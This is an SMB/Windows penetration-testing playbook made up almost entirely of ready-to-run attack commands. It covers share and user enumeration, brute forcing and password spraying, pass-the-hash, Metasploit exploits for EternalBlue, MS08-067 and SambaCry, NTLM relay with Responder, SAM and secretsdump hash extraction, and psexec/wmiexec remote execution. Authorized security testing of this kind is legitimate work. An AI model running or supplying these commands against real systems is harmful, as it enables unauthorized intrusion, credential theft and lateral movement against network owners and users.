# SMB/Windows Penetration Testing Methodology

## Overview
SMB (Server Message Block) runs on ports 445 (direct) and 139 (over NetBIOS). It's the primary file sharing protocol for Windows networks and a common attack vector.

## Initial Reconnaissance

### 1. Port Scanning
```bash
# Nmap SMB scripts
nmap -sV -sC -p139,445 --script=smb-* {target}

# Specific vulnerability checks
nmap -p445 --script=smb-vuln-* {target}
```

### 2. SMB Version Detection
```bash
# Using Nmap
nmap -p445 --script smb-protocols {target}

# Using smbclient
smbclient -L //{target}/ -N
```

## Enumeration

### 1. Share Enumeration
```bash
# smbclient
smbclient -L //{target}/ -N
smbclient -L //{target}/ -U username%password

# smbmap
smbmap -H {target}
smbmap -H {target} -u '' -p ''
smbmap -H {target} -u 'guest' -p ''
smbmap -H {target} -u username -p password

# CrackMapExec
crackmapexec smb {target} -u '' -p '' --shares
crackmapexec smb {target} -u 'guest' -p '' --shares

# Impacket
impacket-smbclient -no-pass {target}
```

### 2. Comprehensive Enumeration
```bash
# enum4linux (classic)
enum4linux -a {target}

# enum4linux-ng (modern)
enum4linux-ng -A {target}
```

### 3. User Enumeration
```bash
# CrackMapExec
crackmapexec smb {target} -u '' -p '' --users
crackmapexec smb {target} -u '' -p '' --rid-brute

# rpcclient
rpcclient -U '' -N {target}
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 500
```

### 4. Password Policy
```bash
# CrackMapExec
crackmapexec smb {target} -u '' -p '' --pass-pol

# rpcclient
rpcclient -U '' -N {target}
rpcclient> getdompwinfo
```

## Authentication Attacks

### 1. Null Session
```bash
# smbclient
smbclient //{target}/IPC$ -N

# rpcclient
rpcclient -U '' -N {target}

# CrackMapExec
crackmapexec smb {target} -u '' -p ''
```

### 2. Guest Account
```bash
smbclient -L //{target}/ -U 'guest'%''
crackmapexec smb {target} -u 'guest' -p ''
```

### 3. Brute Force
```bash
# Hydra
hydra -L users.txt -P passwords.txt smb://{target}

# CrackMapExec
crackmapexec smb {target} -u users.txt -p passwords.txt

# Medusa
medusa -h {target} -U users.txt -P passwords.txt -M smbnt
```

### 4. Password Spraying
```bash
# CrackMapExec
crackmapexec smb {target} -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb {target} -u users.txt -p 'Summer2024!' --continue-on-success
```

### 5. Pass-the-Hash
```bash
# CrackMapExec
crackmapexec smb {target} -u username -H NTHASH

# Impacket
impacket-smbclient -hashes :NTHASH domain/user@{target}
impacket-psexec -hashes :NTHASH domain/user@{target}
impacket-wmiexec -hashes :NTHASH domain/user@{target}

# Evil-WinRM
evil-winrm -i {target} -u username -H NTHASH
```

## Vulnerability Exploitation

### 1. MS17-010 (EternalBlue)
```bash
# Check
nmap -p445 --script smb-vuln-ms17-010 {target}

# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
exploit
```

### 2. MS08-067 (NetAPI)
```bash
# Check
nmap -p445 --script smb-vuln-ms08-067 {target}

# Metasploit
use exploit/windows/smb/ms08_067_netapi
set RHOSTS {target}
exploit
```

### 3. CVE-2017-7494 (SambaCry)
```bash
# Check
nmap -p445 --script smb-vuln-cve-2017-7494 {target}

# Metasploit
use exploit/linux/samba/is_known_pipename
set RHOSTS {target}
exploit
```

### 4. SMB Signing Disabled
```bash
# Check
nmap -p445 --script smb-security-mode {target}

# Can enable relay attacks if disabled
```

## Share Access

### Connecting to Shares
```bash
# smbclient
smbclient //{target}/ShareName -U username%password
smbclient //{target}/ShareName -N  # null session

# Mount share
mount -t cifs //{target}/ShareName /mnt/share -o username=user,password=pass
```

### Common Shares to Check
- `C$` - Admin share (admin access)
- `ADMIN$` - Admin share (admin access)
- `IPC$` - Inter-process communication
- `SYSVOL` - Domain policies (domain joined)
- `NETLOGON` - Logon scripts (domain joined)

### Interesting Files
```bash
# Search recursively
smbmap -H {target} -u user -p pass -R ShareName --depth 5

# Download all files
smbclient //{target}/ShareName -U user%pass -c 'recurse; prompt; mget *'
```

Files to look for:
- Configuration files (web.config, *.ini, *.conf)
- Scripts (*.ps1, *.vbs, *.bat)
- Office documents (may contain macros or credentials)
- Database files (*.mdb, *.accdb, *.db)
- Password files (passwords.txt, creds.txt)
- Private keys (*.key, *.pem, id_rsa)

## Metasploit Modules

```bash
# Enumeration
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_lookupsid

# Authentication
use auxiliary/scanner/smb/smb_login

# Exploitation
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms08_067_netapi
use exploit/linux/samba/is_known_pipename
use exploit/windows/smb/psexec

# Post-exploitation
use auxiliary/admin/smb/psexec_command
use post/windows/gather/credentials/credential_collector
```

## Relay Attacks

### SMB Relay (Requires SMB Signing Disabled)
```bash
# Find targets without SMB signing
crackmapexec smb {network}/24 --gen-relay-list targets.txt

# Start relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# Trigger authentication (e.g., via phishing or responder)
```

### Responder
```bash
# Start Responder
responder -I eth0 -wrf

# Capture hashes for cracking or relay
```

## Post-Exploitation

### Extract Hashes
```bash
# With admin access
impacket-secretsdump domain/admin:password@{target}
impacket-secretsdump -hashes :NTHASH domain/admin@{target}

# SAM dump
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

### Remote Execution
```bash
# PSExec
impacket-psexec domain/user:password@{target}

# WMIExec
impacket-wmiexec domain/user:password@{target}

# SMBExec
impacket-smbexec domain/user:password@{target}

# ATExec (scheduled task)
impacket-atexec domain/user:password@{target} "command"
```

## Checklist

- [ ] SMB version identified
- [ ] Shares enumerated
- [ ] Null session tested
- [ ] Guest access tested
- [ ] Users enumerated
- [ ] Password policy obtained
- [ ] MS17-010 checked
- [ ] MS08-067 checked (older systems)
- [ ] SMB signing status checked
- [ ] Sensitive files searched
- [ ] Authentication tested
- [ ] Relay opportunities assessed
